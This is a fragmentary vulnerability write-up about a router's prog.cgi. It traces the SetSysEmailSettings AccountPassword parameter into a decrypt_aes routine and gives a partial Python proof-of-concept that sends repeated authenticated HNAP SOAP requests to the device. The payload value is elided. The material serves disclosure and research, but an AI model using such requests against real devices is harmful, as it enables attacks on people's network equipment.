...
In prog.cgi, we can find the code details in sub_4366D4,the program passes the contents obtained by the SetSysEmailSettings/AccountPassword parameter to V2,then passed to V11.

![](pic/code1.png "")

The V11 parameter is called by the function decrypt_aes (). In the decrypt_aes () function, it is passed to the sub_427184 ().
...
for i in range(REPEAT_TIMES):
	...
	<soap:Body>
		<SetSysEmailSettings xmlns="http://purenetworks.com/HNAP1/">
			...
			<EmailFrom>test@test.net</EmailFrom>
			<EmailTo>test2@test.net</EmailTo>
			<EmailSubject/>
			<SMTPServerAddress>smtp.test.net</SMTPServerAddress>
			<SMTPServerPort>111</SMTPServerPort>
    ...
    headers['SOAPAction'] = '"http://purenetworks.com/HNAP1/SetSysEmailSettings"'
    headers['HNAP_AUTH'] = hnap_auth("SetSysEmailSettings", private_key)
    r = requests.post(f'http://{IP}/HNAP1/', data=payload, headers=headers)
    print(r.text)
```
